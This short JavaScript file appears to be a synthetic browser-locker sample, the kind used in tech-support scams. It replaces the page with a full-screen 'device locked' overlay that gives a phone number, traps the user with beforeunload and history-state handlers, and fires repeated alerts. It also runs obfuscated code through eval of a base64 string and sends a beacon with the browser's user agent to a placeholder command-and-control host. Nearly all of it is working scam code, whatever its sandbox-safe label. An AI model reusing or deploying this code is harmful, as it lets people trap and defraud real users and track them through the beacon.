// Browser locker: full-screen extortion overlay, unload/history traps and a C2
// beacon. Synthetic and sandbox-safe; no real lock or ransomware.
(function () {
  var C2 = 'https://c2.example.test/locker';
  eval(atob('Y29uc29sZS5sb2coJ1tMT0NLRVJdIG92ZXJsYXkgbW9kdWxlIHJlYWR5Jyk7'));
  console.log('[LOCKER] arming overlay');
  try {
    document.body.innerHTML =
      '<div style="position:fixed;inset:0;background:#000;color:#fff;z-index:99999;padding:10vh">' +
      '<h1>YOUR DEVICE IS LOCKED</h1><p>Call +1-000-000-0000. Do not close this page.</p></div>';
  } catch (error) {}
  try {
    window.addEventListener('beforeunload', function (event) { event.preventDefault(); event.returnValue = 'stay'; return 'stay'; });
  } catch (error) {}
  try { history.pushState({ locked: true }, '', '#locked'); } catch (error) {}
  var ticks = 0;
  var timer = setInterval(function () {
    ticks += 1;
    try { alert('Device locked. Call support. (' + ticks + ')'); } catch (error) {}
    if (ticks >= 3) clearInterval(timer);
  }, 250);
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ ua: navigator.userAgent, at: Date.now() })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('locker:seen', '1'); } catch (error) {}
})();
